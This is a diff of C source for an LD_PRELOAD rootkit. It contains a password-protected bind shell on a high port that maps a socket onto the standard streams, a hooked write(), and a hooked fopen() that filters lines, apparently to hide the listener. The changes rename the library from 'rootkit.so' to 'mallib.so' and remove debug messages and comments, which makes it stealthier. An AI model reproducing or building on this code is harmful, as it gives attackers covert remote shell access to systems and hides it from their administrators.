@@ -12,7 +12,7 @@
 #define PASS "givemebash"
 #define HEX_PORT "FED4"
 #define PORT 65236
-#define FILENAME "rootkit.so"
+#define FILENAME "mallib.so"
 
 
 int bind_shell(){
@@ -21,34 +21,27 @@ int bind_shell(){
 	sockfd = socket(AF_INET,SOCK_STREAM,0);
 	
 	if (sockfd < 0){
-		printf("failed to create socket\n");
 		return -1;
 	}
-
 	
 	struct sockaddr_in server_addr;
 	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(PORT);
 	server_addr.sin_addr.s_addr = 0;
 
-
 	const static int optval = 1;
 
 	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
 
 	if ( 0 > bind(sockfd,(struct sockaddr *)&server_addr,sizeof(server_addr))){
-		printf("failed to bind\n!");
 		return -1;
 	}
 
-	//bind completed
 	if (listen(sockfd,0) < 0){
-		printf("failed to start listening;\n");
 		return -1;
 	}
 	
 	session  = accept(sockfd,NULL,NULL);
-
 
 	for (int i = 0; i < 3; i++)
 		dup2(session, i);
@@ -65,7 +58,6 @@ int bind_shell(){
 		close(sockfd);
 	}
 	
-
 }
 
 ssize_t write(int fd, const void *buf, size_t count){
@@ -135,8 +127,7 @@ FILE *fopen(const char *pathname, const char *mode){
 			if (listener != NULL){
 				continue;
 			}
-			else
-			{
+			else{
 				fputs(line, temp);
 			}
 		}
